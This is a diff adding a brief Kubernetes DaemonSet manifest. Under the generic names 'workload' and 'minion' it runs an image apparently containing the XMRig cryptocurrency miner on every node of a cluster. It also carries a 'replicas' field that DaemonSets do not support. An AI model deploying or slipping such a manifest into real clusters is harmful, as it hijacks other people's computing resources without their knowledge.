@@ -1,0 +1,21 @@
+---
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  labels:
+    run: workload
+  name: workload
+spec:
+  replicas: 0
+  selector:
+    matchLabels:
+      app: workload
+  template:
+    metadata:
+      labels:
+        app: workload
+    spec:
+      containers:
+        - image: ghcr.io/codekow/xmrig
+          name: minion
+
